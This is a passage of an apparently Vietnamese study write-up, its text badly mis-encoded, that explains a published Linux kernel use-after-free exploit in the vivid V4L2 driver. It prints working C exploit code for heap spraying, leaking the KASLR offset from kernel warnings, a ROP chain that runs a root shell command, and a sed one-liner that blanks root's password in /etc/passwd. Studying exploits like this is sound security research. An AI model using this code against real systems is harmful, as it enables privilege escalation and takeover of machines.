x√≥a h√†ng ƒë·ª£i vid_cap_active ra kh·ªèi thi·∫øt b·ªã, tr·∫£ kh√≥a (hi v·ªçng vivid_thread_vid_cap s·∫Ω l·∫•y ƒë∆∞·ª£c kh√≥a n√†y)   vb_core_dqbuf l·∫•y ƒë∆∞·ª£c kh√≥a, g·ªçi __enqueue_in_driver ƒë·ªÉ th√™m vb2_buffer v√†o h√†ng ƒë·ª£i. Th·ª±c hi·ªán l·ªánh read v√† gi·∫£i ph√≥ng kh√≥a     vivid_stop_generating_vid_cap nh·∫≠n ƒë∆∞·ª£c kh√≥a v√† th·ª±c hi·ªán l·ªánh close(fd) ƒë·ªÉ ƒë√≥ng process v√† gi·∫£i ph√≥ng v√πng nh·ªõ vb2_buffer, v√πng nh·ªõ n√†y v·∫´n c√≤n n·∫±m trong h√†ng ƒë·ª£i vid_cap_active, v√† c√≥ th·ªÉ ƒë∆∞·ª£c d√πng cho l·∫ßn ƒë·ªçc ti·∫øp teho -\u0026gt; l·ªói UAF    B∆∞·ªõc v√†o v√≤ng l·∫∑p m·ªõi, ƒë·ª£i c√≥ kh√≥a ƒë·ªÉ g·ªçi vivid_thread_vid_cap ƒë·ªÉ ƒë∆∞a v√πng nh·ªõ vb2_buffer c≈© v·ª´a b·ªã kfree v√†o vivid_fillbuff v√¨ v√πng nh·ªõ b·ªã kfree n√™n s·∫Ω b·ªã x√≥a ƒëi nh·ªØng tr∆∞·ªùng c·∫ßn thi·∫øt cho qu√° tr√¨nh th·ª±c hi·ªán, n√™n sau ƒë√≥ ch∆∞∆°ng tr√¨nh s·∫Ω b·ªã crash    Deceived V4L2 sub system  Khi streaming d·ª´ng h·∫≥n, tham kh·∫£o cu·ªëi c√πng t·ªõi /dev/video0 ƒë∆∞·ª£c gi·∫£i ph√≥ng, V4L2 subsystem calls s·∫Ω g·ªçi vb2_core_queue_release() ƒë·ªÉ gi·∫£i ph√≥ng t√†i nguy√™n. H·ªá th·ªëng s·∫Ω l·∫ßn l∆∞·ª£t g·ªçi __vb2_queue_free() ƒë·ªÉ gi·∫£i ph√≥ng vb2_buffer - ƒë√£ ƒë∆∞·ª£c th√™m v√†o h√†ng ƒë·ª£i khi m√† exploit c·∫£u ch√∫ng ta th·∫Øng race.\nTuy nhi√™n, driver kh√¥ng bi·∫øt ƒëi·ªÅu ƒë√≥ v√† v·∫´n gi·ªØ tham kh·∫£o ƒë·∫øn m·ªôt object ƒë√£ ƒë∆∞·ª£c gi·∫£i ph√≥ng. Khi stream b·∫Øt ƒë·∫ßu l·∫°i, n√≥ s·∫Ω nh·∫£y v√†o exploit loop, vivid driver s·∫Ω ch·∫°m ƒë·∫øn ƒë·ªëi t∆∞·ª£ng b·ªã gi·∫£i ph√≥ng v√† ƒëi·ªÅu n√†y ƒë√£ ƒë∆∞·ª£c KASAN ph√°t hi·ªán.  Heap spraying  Heap spraying l√† kƒ© thu·∫≠t, m·ª•c ƒë√≠ch ƒë·∫∑t nh·ªØng controlled bytes v√†o nh·ªØng v·ªã tr√≠ c√≥ th·ªÉ x√°c ƒë·ªãnh tr∆∞·ªõc tr√™n heap. Kƒ© thu·∫≠t n√†y th∆∞·ªùng li√™n quan t·ªõi vi·ªác c·∫•p ph√°t nhi·ªÅu ƒë·ªëi t∆∞·ª£ng tr√™n heap v·ªõi controlled contents v√† l√†m sao ƒë·ªÉ m·ªôt s·ªë allocator ƒë·ªÉ c·∫•p ph√°t ngay v√πng nh·ªõ tr√™n. Heap spraying s·ª≠ d·ª•ng ƒë·ªÉ khai th√°c use-after-free trong Linux Kernel s·∫Ω th∆∞·ªùng d√πng kmalloc() v√¨ h√†m n√†y s·∫Ω tr·∫£ v·ªÅ ƒë·ªãa ch·ªâ c·ªßa v√πng nh·ªõ v·ª´a ƒë∆∞·ª£c free. Do ƒë√≥, n·∫øu c·∫•p ph√°t m·ªôt ƒë·ªëi t∆∞·ª£ng, c√πng ƒë·ªãa ch·ªâ v·ªõi controlled contents s·∫Ω cho ph√©p ch√∫ng ta ghi ƒë√® v√πng nh·ªõ c√≥ th·ªÉ khai th√°c.\n·∫¢nh tham kh·∫£o t·ª´: https://a13xp0p0v.github.io/2020/02/15/CVE-2019-18683.html Kƒ© thu·∫≠t n√†y c√≥ th·ªÉ ƒë∆∞·ª£c tri·ªÉn khai b·∫±ng c√°ch s·ª≠ d·ª•ng k·∫øt h·ª£p userfaultfd() + setxattr() v·ªõi √Ω t∆∞·ªüng ch√≠nh r·∫±ng userfaultfd() s·∫Ω cho ph√©p ch√∫ng ta ki·ªÉm so√°t ƒë∆∞·ª£c lifetime c·ªßa d·ªØ li·ªáu ƒë∆∞·ª£c c·∫•p ph√°t b·ªüi setxattr() trong kernelspace. Quay tr·ªü v·ªÅ v·ªõi l·ªó h·ªïng n√†y, vb2_buffer s·∫Ω ƒë∆∞·ª£c free khi streaming d·ª´ng v√† s·∫Ω ƒë∆∞·ª£c use ·ªü l·∫ßn streaming ti·∫øp theo. Do ƒë√≥, n·∫øu ch√∫ng ta s·ª≠ d·ª•ng kƒ© thu·∫≠t heap spraying v√†o cu·ªëi v√≤ng l·∫∑p th·ª© nh·∫•t tr∆∞·ªõc khi streaming stop th√¨ khi streaming b·∫Øt ƒë·∫ßu ·ªü v√≤ng l·∫∑p k·∫ø ti·∫øp th√¨ ch√∫ng ta c√≥ th·ªÉ d√πng kmalloc() ƒë·ªÉ c·∫•p ph√°t v√πng nh·ªõ v·ª´a free ·ªü cu·ªëi v√≤ng l·∫∑p tr∆∞·ªõc v·ªõi controlled data. Tuy nhi√™n, l√∫c b·∫•y gi·ªù, t√°c gi·∫£ ph√°t hi·ªán ra m·ªôt v·∫•n ƒë·ªÅ: v√πng nh·ªõ vb2_buffer kh√¥ng ph·∫£i l√† v√πng nh·ªõ cu·ªëi c√πng ƒë∆∞·ª£c gi·∫£i ph√≥ng b·ªüi __vb2_queue_free(), do ƒë√≥, ·ªü v√≤ng l·∫∑p ti·∫øp theo, khi g·ªçi kmalloc) th√¨ n√≥ s·∫Ω kh√¥ng tr·∫£ v·ªÅ ƒë√∫ng ƒë·ªãa ch·ªâ m√† ch√∫ng ta c·∫ßn. V√¨ th·∫ø, ch√∫ng ta c·∫ßn ph·∫£i allocate nhi·ªÅu l·∫ßn ƒë·ªÉ c√≥ th·ªÉ c·∫•p ph√°t ƒë√∫ng ƒë∆∞·ª£c v·ªã tr√≠ mong mu·ªën. Nh∆∞ng mu·ªën √°p d·ª•ng ƒëi·ªÅu tr√™n v·ªõi hai h√†m userfaultfd() + setxattr() l√† kh√¥ng d·ªÖ d√†ng v√¨: d·ªØ li·ªáu do setxattr() c·∫•p ph√°t ch·ªâ t·ªìn t·∫°i cho ƒë·∫øn khi tr√¨nh x·ª≠ l√≠ l·ªói trang userfaultfd() g·ªçi h√†m ioctl v·ªõi flag UFFDIO_COPY. Hay n√≥i c√°ch kh√°c, mu·ªën d·ªØ li·ªáu ƒë∆∞·ª£c c·∫•p ph√°t b·ªüi setxattr() kh√¥ng b·ªã m·∫•t th√¨ userfaultfd() kh√¥ng g·ªçi ioctl. T√°c gi·∫£ gi·∫£i quy·∫øt v·∫•n ƒë·ªÅ n√†y b·∫±ng c√°ch t·∫°o ra m·ªôt pool of threads: m·ªói thread n√†y ƒë∆∞·ª£c g·ªçi l√† spraying thread, g·ªçi h√†m setxattr() ƒë∆∞·ª£c x·ª≠ l√≠ b·ªüi userfaultfd() v√† l∆∞u d·ªØ li·ªáu ƒë∆∞·ª£c c·∫•p ph√°t.  T√¥i v·∫´n ch∆∞a bi·∫øt t√¢t c·∫£ c√°c spraying thread ƒë·ªÅu ƒë∆∞·ª£c x·ª≠ l√≠ b·ªüi userfaultfd() hay m·ªói spraying thread s·∫Ω c√≥ 1 userfaultfd() t∆∞∆°ng ·ª©ng (s·∫Ω ƒë∆∞·ª£c gi·∫£i th√≠ch ·ªü nh·ªØng m·ª•c d∆∞·ªõi)\r\nB√¢y gi·ªù, ch√∫ng ta s·∫Ω vi·∫øt payload g√¨ v√†o vb2_buffer?\nControl flow hijack for V4L2 subsystem L∆∞·ª£c ƒë·ªì d∆∞·ªõi ƒë√¢y ƒë·∫∑c t·∫£ s∆° l∆∞·ª£c m·ªëi quan h·ªá gi·ªØa c√°c object trong V4L2 subsystem\nT·∫°i ƒë√¢y th√¨ t√°c gi·∫£ b·∫£o √¥ng ·∫•y t·ªën kh√° nhi·ªÅu th·ªùi gian ƒë·ªÉ t√¨m c√°ch ghi n·ªôi dung t√πy √Ω v√†o vb2_buffer v√† b·∫±ng m·ªôt c√°ch th·∫ßn k·ª≥ n√†o ƒë√≥, √¥ng ta ƒë√£ t√¨m ra con ƒë∆∞·ªùng nh∆∞ tr√™n l∆∞·ª£c ƒë·ªì:\nvb2_buffer.vb2_queue-\u0026gt;mem_ops-\u0026gt;vaddr\nD·ªÖ th·∫•y, h√†m vaddr() nh·∫≠n vb2_buffer.planes[0].mem_priv l√†m tham s·ªë.\nUnexpected troubles: kthread context  Ch√∫ng ta b·∫Øt ƒë·∫ßu vi·∫øt nh·ªØng payload ƒë·ªÉ V4L2 ch·∫°m t·ªõi con tr·ªè h√†m n√†y.   T·∫Øt SMAP (Supervisor Mode Access Prevention), SMEP (Supervisor Mode Execution Prevention), KPTI (Kernel Page-Table Isolation) L√†m vb2_buffer.vb2_queue tr·ªè t·ªõi m·ªôt v√πng nh·ªõ ƒë∆∞·ª£c √°nh x·∫° tr√™n userspace. Deferencing con tr·ªè n√†y s·∫Ω cho l·ªói \u0026quot;unable to handle page fault\u0026quot;.\nL√≠ do tr·∫£ v·ªÅ l·ªói v√¨ con tr·ªè m√† ch√∫ng ta mu·ªën deferencing ƒëang ·ªü kernel thread context, n∆°i m√† userspace kh√¥ng th·ªÉ √°nh x·∫° t·ªõi. Do ƒë√≥, v·∫•n ƒë·ªÅ l√∫c b√¢y gi·ªù, l√†m sao ƒë·∫∑t vb2_queue v√† vb2_mem_ops t·∫°i nh·ªØng v√πng nh·ªõ m√† bi·∫øt ƒë∆∞·ª£c ƒë·ªãa ch·ªâ, v√† c√≥ th·ªÉ truy c·∫≠p t·ª´ kthread context.   Trong h√†m __vb2_queue_cancel() cho ph√©p ch√∫ng ta g·ª≠i nh·ªØng c·∫£nh b√°o (warning), ƒëi·ªÅu ƒë√≥ c√≥ nghƒ©a ch√∫ng ta c√≥ th·ªÉ ph√¢n t√≠ch c√∫ ph√°p c·ªßa kernel warning information (c√≥ th·ªÉ th·ª±c hi·ªán tr√™n c√°c ubuntu server). ƒêi·ªÅu n√†y cho ph√©p ch√∫ng ta ƒë∆∞a payload v√†o kernel stackv√† gi·ªØ n√≥ b·∫±ng userfaultfd(), gi·ªëng nh∆∞ kƒ© thu·∫≠t heap spraying s·ª≠ d·ª•ng userfaultfd() + setxattr(). H√†m copy_from_user() s·∫Ω gi√∫p ta ƒë∆∞a d·ªØ li·ªáu v√†o kernel stack. Ch√∫ng ta s·∫Ω ph√¢n t√≠ch c√∫ ph√°p c·ªßa warning ƒë·ªÉ l·∫•y ƒë·ªãa ch·ªâ c·ªßa kernel stack v√† d·ª± ƒëo√°n d·ª± ƒëo√°n ƒë·ªãa ch·ªâ c·ªßa payload.  Exploit Orchestra  T·∫°o ra pool of threads v√† ƒë·ªìng b·ªô h√≥a ch√∫ng b·∫±ng h√†m pthread_barriers. D∆∞·ªõi ƒë√¢y l√† code pthread_barriersƒë∆∞·ª£c ƒë·∫∑t t·∫°i c√°c con tr·ªè tham kh·∫£o ch√≠nh trong su·ªët qu√° tr√¨nh khai th√°c  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  #define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)\r\r#define THREADS_N 50\r\rpthread_barrier_t barrier_prepare;\rpthread_barrier_t barrier_race;\rpthread_barrier_t barrier_parse;\rpthread_barrier_t barrier_kstack;\rpthread_barrier_t barrier_spray;\rpthread_barrier_t barrier_fatality;\r...\rret = pthread_barrier_init(\u0026amp;barrier_prepare, NULL, THREADS_N - 3);\rif (ret != 0)\rerr_exit(\u0026#34;[-] pthread_barrier_init\u0026#34;);\rret = pthread_barrier_init(\u0026amp;barrier_race, NULL, 2);\rif (ret != 0)\rerr_exit(\u0026#34;[-] pthread_barrier_init\u0026#34;);\rret = pthread_barrier_init(\u0026amp;barrier_parse, NULL, 3);\rif (ret != 0)\rerr_exit(\u0026#34;[-] pthread_barrier_init\u0026#34;);\rret = pthread_barrier_init(\u0026amp;barrier_kstack, NULL, 3);\rif (ret != 0)\rerr_exit(\u0026#34;[-] pthread_barrier_init\u0026#34;);\rret = pthread_barrier_init(\u0026amp;barrier_spray, NULL, THREADS_N - 5);\rif (ret != 0)\rerr_exit(\u0026#34;[-] pthread_barrier_init\u0026#34;);\rret = pthread_barrier_init(\u0026amp;barrier_fatality, NULL, 2);\rif (ret != 0)\rerr_exit(\u0026#34;[-] pthread_barrier_init\u0026#34;);\r   M·ªói thread c√≥ m·ªôt vai tr√≤ ri√™ng. Trong tr∆∞·ªùng h·ª£p n√†y, ta d√πng 50 thread v·ªõi 5 vai tr√≤ kh√°c nhau:  2 racer threads (THREADS_N - 6) = 44 sprayer pthreads, nh·ªØng thread n√†y s·∫Ω gi·ªØ setxattr() ƒë∆∞·ª£c x·ª≠ l√≠ b·ªüi userfaultfd() 2 pthread cho userfaulfd() x·ª≠ l√≠ page fault. ƒê·∫øn ƒë√¢y t√¥i ƒë√£ gi·∫£i ƒë√°p ƒë∆∞·ª£c th·∫Øc m·∫Øc ·ªü tr√™n, 2 thread cho userfaultfd() x·ª≠ l√≠ cho 44 sprayer pthreads. 1 pthread cho ph√¢n t√≠ch /dev/kmsg v√† x·ª≠ l√≠ payload 1 fatility pthread ch·ªãu tr√°ch nhi·ªám k√≠ch ho·∫°t leo thang ƒëƒÉc quy·ªÅn - privilege escalation.    Nh·ªØng con s·ªë n√†y t·ª´ ƒë√¢u m√† ra hay ch·ªâ ch·ªçn random?\r  Nh·ªØng thread v·ªõi nh·ªØng vai tr√≤ kh√°c nhau s·∫Ω ƒë∆∞·ª£c ƒë·ªìng b·ªô h√≥a t·∫°i c√°c pthread_barries kh√°c nhau. Tham s·ªë cu·ªëi c√πng c·ªßa pthread_barrier_init() ch·ªâ ƒë·ªãnh s·ªë thread PH·∫¢I g·ªçi pthread_barrier_wait() cho t·ª´ng barrier c·ª• th·ªÉ tr∆∞·ªõc khi n√≥ ti·∫øp t·ª•c giao ti·∫øp v·ªõi nhau. B·∫£ng sau s·∫Ω m√¥ t·∫£ chi ti·∫øt t·∫•t c·∫£ c√°c pthread v·ªõi vai tr√≤ khai th√°c c·ªßa n√≥, ƒë·ªìng b·ªô h√≥a qua pthread_barrier_wait(). barrier ƒë∆∞·ª£c li·ªát k√™ theo tr√¨nh t·ª± th·ªùi gian th·ª±c hi·ªán. B·∫£ng n√†y n√™n ƒë∆∞·ª£c ƒë·ªçc theo t·ª´ng d√≤ng v√† ƒë·ª´ng qu√™n, c√°c pthread ƒëang th·ª±c hi·ªán song song.     pthreads 2 racers 44 sprayers page fault hander #1 page fault hander #2 kmsg parser fatality     1. barrier_prepare (for 47 pthreads) wait on barrier 1. create files in tmpfs for doing setxattr() later 2. wait on barrier \u0026mdash; \u0026mdash; 1. open /dev/kmsg 2. wait on barrier \u0026mdash;   2. barrier_race (for 2 pthreads) 1. usleep() to let other pthread go to their next barrier 2. wait on barrier 3. race \u0026mdash; \u0026mdash; \u0026mdash; \u0026mdash; \u0026mdash;   3. barrier_parse (for 3 pthreads) wait on barrier \u0026mdash; \u0026mdash; \u0026mdash; 1. wait on barrier 2. parse the kernel warning to extract RSP and R11 (contains a pointer to code) 3. Calculate the address of the kernel stack top and the KASLR offset. adapt the pointers in the payloads for kernel heap and stack. \u0026mdash;   4. barrier_kstack (for 3 pthreads) 1. wait on barrier 2. place the kernel stack payload via adjtimex() and hang \u0026mdash; \u0026mdash; \u0026mdash; wait on barrier \u0026mdash;   5. barrier_spray (for 45 pthreads) \u0026mdash; 1. wait on barrier 2. place the kernel heap payload via setxattr() and hang \u0026mdash; 1. catch 2 page faults from adjtimex() called by racers. 2. wait on barrier \u0026mdash; \u0026mdash;   6. barrier_fatality (for 2 pthreads) \u0026mdash; \u0026mdash; 1. catch 44 page faults from setxattr() called by sprayers 2. wait on barrier \u0026mdash; \u0026mdash; 1. wait on barrier 2. trigger the payload for privilege escalation 3. the end!    Ch∆∞a n·∫Øm v·ªØng / hi·ªÉu r√µ c√°c pthread ƒë∆∞·ª£c li·ªát k√™ trong b·∫£ng tr√™n\r  V·∫•n ƒë·ªÅ ƒë·∫∑t ra v·ªõi t√¥i b√¢y gi·ªù l√† l√†m sao ƒë·ªÉ ƒëi·ªÅu khi·ªÉn c√°c thread gi·ªëng nh∆∞ table tr√™n. Quay l·∫°i m√¥n OS v√† nh·∫≠n ra m√¨nh ch·∫£ nh·ªõ g√¨ c·∫£ == h·∫≠u qu·∫£ c·ªßa vi·ªác h·ªçc v·∫πc. B√¢y gi·ªù b·∫Øt ƒë·∫ßu h·ªçc v·ªÅ n√≥\u0026hellip;\nOke, ƒë√£ hi·ªÉu, ch√∫ng ta c√≥ barrier l√† r√†o c·∫£n, khi ƒë·ªß thread th√¨ n√≥ s·∫Ω m·ªü c·ª≠a, v·∫≠y l√†m sao m√¨nh qu·∫£n l√≠ ƒë∆∞·ª£c khi n√†o c·∫ßn 2 thread, khi n√†o c·∫ßn 44 thread? ƒê∆°n gi·∫£n ch√∫ng ta d·ª± v√†o function, v√† ƒë·∫∑t barrier v√†o cu·ªëi nh·ªØng function tr√™n. Good, T√¥i ƒë√£ hi·ªÉu ƒë∆∞·ª£c ƒëo·∫°n n√†y v√† ƒë√£ c√≥ idea ti·∫øp t·ª•c l√†m.  Anatomy of the exploit payload  Payload s·∫Ω ƒë∆∞·ª£c t·∫°o ·ªü 2 n∆°i:   Trong kernel heap b·∫±ng sprayer threads b·∫±ng c√°ch s·ª≠ d·ª•ng h√†m setxattr() ƒë∆∞·ª£c x·ª≠ l√≠ b·ªüi userfaultfd() Trong kernel stack b·∫±ng racer threads b·∫±ng c√°ch s·ª≠ d·ª•ng adjtimex() ƒë∆∞·ª£c x·ª≠ l√≠ b·ªüi userfaultfd(). System call n√†y ƒë∆∞·ª£c ch·ªçn v√¨ n√≥ c√≥ g·ªçi h√†m copy_from_user() t·ªõi kernel stack.   Payload g·ªìm 3 ph·∫ßn:   vb2_buffer trong kernel heap. vb2_queue trong kernel stack. vb2_mem_ops: trong kernel stack.   D∆∞·ªõi ƒë√¢y l√† ch∆∞∆°ng tr√¨nh t·∫°o payload. B·∫Øt ƒë·∫ßu ph·∫ßn khai th√°c, ta chu·∫©n b·ªã n·ªôi dung c·ªßa payload ·ªü userspace, v√πng nh·ªõ ƒë∆∞·ª£c t·∫°o b·ªüi setxattr() syscall s·∫Ω ƒë∆∞·ª£c ƒë∆∞a v√†o kernel heap.  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  #define MMAP_SZ 0x2000\r#define PAYLOAD_SZ 504\r\rvoid init_heap_payload()\r{\rstruct vivid_buffer *vbuf = NULL;\rstruct vb2_plane *vplane = NULL;\rfor_heap = mmap(NULL, MMAP_SZ, PROT_READ | PROT_WRITE,\rMAP_SHARED | MAP_ANONYMOUS, -1, 0);\rif (for_heap == MAP_FAILED)\rerr_exit(\u0026#34;[-] mmap\u0026#34;);\rprintf(\u0026#34; [+] payload for_heap is mmaped to %p\\n\u0026#34;, for_heap);\r/* Don\u0026#39;t touch the second page (needed for userfaultfd) */\rmemset(for_heap, 0, PAGE_SIZE);\rxattr_addr = for_heap + PAGE_SIZE - PAYLOAD_SZ;\rvbuf = (struct vivid_buffer *)xattr_addr;\rvbuf-\u0026gt;vb.vb2_buf.num_planes = 1;\rvplane = vbuf-\u0026gt;vb.vb2_buf.planes;\rvplane-\u0026gt;bytesused = 16;\rvplane-\u0026gt;length = 16;\rvplane-\u0026gt;min_length = 16;\rprintf(\u0026#34; [+] vivid_buffer of size %lu is at %p\\n\u0026#34;,\rsizeof(struct vivid_buffer), vbuf);\r}\r   adjtimex() syscall ghi d·ªØ li·ªáu v√†o kernel stack  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  #define PAYLOAD2_SZ 208\r\rvoid init_stack_payload()\r{\rfor_stack = mmap(NULL, MMAP_SZ, PROT_READ | PROT_WRITE,\rMAP_SHARED | MAP_ANONYMOUS, -1, 0);\rif (for_stack == MAP_FAILED)\rerr_exit(\u0026#34;[-] mmap\u0026#34;);\rprintf(\u0026#34; [+] payload for_stack is mmaped to %p\\n\u0026#34;, for_stack);\r/* Don\u0026#39;t touch the second page (needed for userfaultfd) */\rmemset(for_stack, 0, PAGE_SIZE);\rtimex_addr = for_stack + PAGE_SIZE - PAYLOAD2_SZ + 8;\rprintf(\u0026#34; [+] timex of size %lu is at %p\\n\u0026#34;,\rsizeof(struct timex), timex_addr);\r}\r   Sau khi b·ªã race condition, pthread s·∫Ω ph√¢n t√≠ch c√∫ ph√°p c·ªßa kmsg, tr√≠ch xu·∫•t th√¥ng tin t·ª´ kernel warning:  Gi√° tr·ªã RSP ƒë·ªÉ t√≠nh ƒë·ªãa ch·ªâ ƒë·ªânh c·ªßa kernel stack Gi√° tr·ªã R11 tr·ªè ƒë·∫øn m·ªôt s·ªë v·ªã tr√≠ kh√¥ng ƒë·ªïi trong kernel code. Gi√° tr·ªã n√†y gi√∫p t√≠nh to√°n offset c·ªßa KASLR.    1 2 3 4 5 6 7 8 9 10  #define R11_COMPONENT_TO_KASLR_OFFSET 0x195d80d\r#define KERNEL_TEXT_BASE 0xffffffff81000000\r\rkaslr_offset = strtoul(r11, NULL, 16);\rkaslr_offset -= R11_COMPONENT_TO_KASLR_OFFSET;\rif (kaslr_offset \u0026lt; KERNEL_TEXT_BASE) {\rprintf(\u0026#34;bad kernel text base 0x%lx\\n\u0026#34;, kaslr_offset);\rerr_exit(\u0026#34;[-] kmsg parsing for r11\u0026#34;);\r}\rkaslr_offset -= KERNEL_TEXT_BASE;\r   Sau ƒë√≥, pthread ph√¢n t√≠ch c√∫ ph√°p c·ªßa kmsg, ƒëi·ªÅu ch·ªânh payload tr√™n heap v√† stack.  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  #define TIMEX_STACK_OFFSET 0x1d0\r\t#define LIST_OFFSET 24\r\t#define OPS_OFFSET 64\r\t#define CMD_OFFSET 172\r\rstruct vivid_buffer *vbuf = (struct vivid_buffer *)xattr_addr;\rstruct vb2_queue *vq = NULL;\rstruct vb2_mem_ops *memops = NULL;\rstruct vb2_plane *vplane = NULL;\rprintf(\u0026#34;Adapt payloads knowing that kstack is 0x%lx, kaslr_offset 0x%lx:\\n\u0026#34;,\rkstack,\rkaslr_offset);\r/* point to future position of vb2_queue in timex payload on kernel stack */\rvbuf-\u0026gt;vb.vb2_buf.vb2_queue = (struct vb2_queue *)(kstack - TIMEX_STACK_OFFSET);\rvq = (struct vb2_queue *)timex_addr;\rprintf(\u0026#34; vb2_queue of size %lu will be at %p, userspace %p\\n\u0026#34;,\rsizeof(struct vb2_queue),\rvbuf-\u0026gt;vb.vb2_buf.vb2_queue,\rvq);\r/* just to survive vivid list operations */\rvbuf-\u0026gt;list.next = (struct list_head *)(kstack - TIMEX_STACK_OFFSET + LIST_OFFSET);\rvbuf-\u0026gt;list.prev = (struct list_head *)(kstack - TIMEX_STACK_OFFSET + LIST_OFFSET);\r/*\r* point to future position of vb2_mem_ops in timex payload on kernel stack;\r* mem_ops offset is 0x38, be careful with OPS_OFFSET\r*/\rvq-\u0026gt;mem_ops = (struct vb2_mem_ops *)(kstack - TIMEX_STACK_OFFSET + OPS_OFFSET);\rprintf(\u0026#34; mem_ops ptr will be at %p, userspace %p, value %p\\n\u0026#34;,\r\u0026amp;(vbuf-\u0026gt;vb.vb2_buf.vb2_queue-\u0026gt;mem_ops),\r\u0026amp;(vq-\u0026gt;mem_ops),\rvq-\u0026gt;mem_ops);\rmemops = (struct vb2_mem_ops *)(timex_addr + OPS_OFFSET);\r/* vaddr offset is 0x58, be careful with ROP_CHAIN_OFFSET */\rmemops-\u0026gt;vaddr = (void *)ROP__PUSH_RDI__POP_RSP__pop_rbp__or_eax_edx__RET + kaslr_offset;\rprintf(\u0026#34; mem_ops struct of size %lu will be at %p, userspace %p, vaddr %p at %p\\n\u0026#34;,\rsizeof(struct vb2_mem_ops),\rvq-\u0026gt;mem_ops,\rmemops,\rmemops-\u0026gt;vaddr,\r\u0026amp;(memops-\u0026gt;vaddr));\r  L∆∞·ª£c ƒë·ªì th·ªÉ hi·ªán m·ªëi quan h·ªá gi·ªØa c√°c th√†nh ph·∫ßn b√™n trong kernel memory.\nCh∆∞a th·ª±c s·ª± hi·ªÉu l∆∞·ª£c ƒë·ªì\r\nROP\u0026rsquo;n\u0026rsquo;JOP  Ti·∫øp theo s·∫Ω t·∫°o ra ROP chain ƒë·ªÉ khai th√°c l·ªói.\nT·ª´ l∆∞·ª£c ƒë·ªì, c√≥ th·ªÉ th·∫•y void *(*vaddr)(void *buf_priv) l√† n∆°i ch√∫ng ta ki·ªÉm so√°t lu·ªìng th·ª±c thi ƒë·ªÉ t·∫•n c√¥ng. Tham s·ªë buf_priv ƒë∆∞·ª£c l·∫•y t·ª´ vb2_plane.mem_priv v√† gi√° tr·ªã n√†y thu·ªôc quy·ªÅn ki·ªÉm so√°t c·ªßa ch√∫ng ta. Trong linux kernel x86_64, tham s·ªë ƒë·∫ßu c·ªßa h√†m s·∫Ω ƒë∆∞·ª£c l∆∞u trong thanh ghi RDI, V√¨ th·∫ø chu·ªói l·ªánh push rdi; pop rsp s·∫Ω ƒë∆∞a stack pointer t·ªõi n∆°i m√† ch√∫ng ta mu·ªën RDI. Ti√™p theo ROP chain cho m·ª•c ƒë√≠ch leo thang ƒë·∫∑c quy·ªÅn:  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  #define ROP__PUSH_RDI__POP_RSP__pop_rbp__or_eax_edx__RET 0xffffffff814725f1\r#define ROP__POP_R15__RET 0xffffffff81084ecf\r#define ROP__POP_RDI__RET 0xffffffff8101ef05\r#define ROP__JMP_R15 0xffffffff81c071be\r#define ADDR_RUN_CMD 0xffffffff810b4ed0\r#define ADDR_DO_TASK_DEAD 0xffffffff810bf260\r\runsigned long *rop = NULL;\rchar *cmd = \u0026#34;/bin/sh /home/a13x/pwn\u0026#34;; /* rewrites /etc/passwd to drop root password */\rsize_t cmdlen = strlen(cmd) + 1; /* for 0 byte */\r/* mem_priv is the arg for vaddr() */\rvplane = vbuf-\u0026gt;vb.vb2_buf.planes;\rvplane-\u0026gt;mem_priv = (void *)(kstack - TIMEX_STACK_OFFSET + ROP_CHAIN_OFFSET);\rrop = (unsigned long *)(timex_addr + ROP_CHAIN_OFFSET);\rprintf(\u0026#34; rop chain will be at %p, userspace %p\\n\u0026#34;, vplane-\u0026gt;mem_priv, rop);\rstrncpy((char *)timex_addr + CMD_OFFSET, cmd, cmdlen);\rprintf(\u0026#34; cmd will be at %lx, userspace %p\\n\u0026#34;,\r(kstack - TIMEX_STACK_OFFSET + CMD_OFFSET),\r(char *)timex_addr + CMD_OFFSET);\r/* stack will be trashed near rop chain, be careful with CMD_OFFSET */\r*rop++ = 0x1337133713371337; /* placeholder for pop rbp in the pivoting gadget */\r*rop++ = ROP__POP_R15__RET + kaslr_offset;\r*rop++ = ADDR_RUN_CMD + kaslr_offset;\r*rop++ = ROP__POP_RDI__RET + kaslr_offset;\r*rop++ = (unsigned long)(kstack - TIMEX_STACK_OFFSET + CMD_OFFSET);\r*rop++ = ROP__JMP_R15 + kaslr_offset;\r*rop++ = ROP__POP_R15__RET + kaslr_offset;\r*rop++ = ADDR_DO_TASK_DEAD + kaslr_offset;\r*rop++ = ROP__JMP_R15 + kaslr_offset;\rprintf(\u0026#34; [+] the payload for kernel heap and stack is ready. Put it.\\n\u0026#34;);\r  C√°ch th·ª©c ho·∫°t ƒë·ªông c·ªßa ROP chain  ROP chain ƒë∆∞a ƒë·ªãa ch·ªâ c·ªßa h√†m run_cmd() t·ª´ kernel/reboot.c v√†o thanh ghi R15. L∆∞u ƒë·ªãa ch·ªâ c·ªßa l·ªánh shell v√†o thanh ghi RDI. ƒê·ªãa ch·ªâ n√†y s·∫Ω l∆∞u tham s·ªë c·ªßa h√†m run_cmd(). Ch∆∞∆°ng tr√¨nh s·∫Ω nh·∫£y t·ªõi run_cmd() ƒë·ªÉ th·ª±c thi /bin/sh /home/edisc/pwn v·ªõi quy·ªÅn root. ƒêo·∫°n m√£ n√†y s·∫Ω vi·∫øt l·∫°i /etc/passwd cho ph√©p ch√∫ng ta ƒëƒÉng nh·∫≠p v·ªõi quy·ªÅn root m√† kh√¥ng c·∫ßn password.  1 2 3  #!/bin/sh\r# drop root password\rsed -i \u0026#39;1s/.*/root::0:0:root:\\/root:\\/bin\\/bash/\u0026#39; /etc/passwd\r  ROP chain nh·∫£y t·ªõi __noreturn_do_task_dead() trong kernel/exit.c. Thao t√°c n√†y nh·∫±m tr√°nh tr∆∞·ªùng h·ª£p kthread hi·ªán t·∫°i kh√¥ng d·ª´ng, n√≥ s·∫Ω l√†m kernel crash - ch√∫ng ta kh√¥ng mu·ªën ƒëi·ªÅu ƒë√≥.  M·ªôt s·ªë ·∫£nh 